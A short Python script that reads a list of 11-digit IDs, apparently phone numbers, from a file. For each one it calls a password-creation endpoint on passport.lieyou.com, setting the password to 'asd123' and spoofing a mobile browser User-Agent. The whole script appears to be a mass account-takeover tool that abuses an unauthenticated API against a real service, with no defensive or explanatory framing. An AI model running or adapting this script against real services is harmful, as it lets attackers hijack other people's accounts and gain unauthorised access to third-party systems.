#! /usr/bin/env python
import requests
import json

def get_url(url):
    headers = {'User-Agent':'Mozilla/5.0(iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1'}
    r = requests.get(url = url,headers = headers,timeout = 30)
    if r.status_code != 200:
        raise Exception('network error:{}'.format(r.status_code))
    return json.loads(r.content)

def read_file():
    with open('data.txt') as f:
        bid = []
        line = f.readlines()
        for line in line:
            temp_id = line.strip()
            if temp_id != '' and temp_id.isdigit() and len(temp_id)==11:
                bid.append(temp_id)
    return bid

def run():
    bid = read_file()
    for bid in bid:
        url = 'http://passport.lieyou.com/lieyou/sdk/create_password?cache=no&bid={}&isNew=1&password=asd123'.format(bid)
        result = get_url(url)
        print('bid:{} result:{}'.format(bid,result['msg']))


if __name__=='__main__':
    try:
        run()
        input('Enter Pass')
    except Exception as e:
        print(e)
        input('Enter Pass')
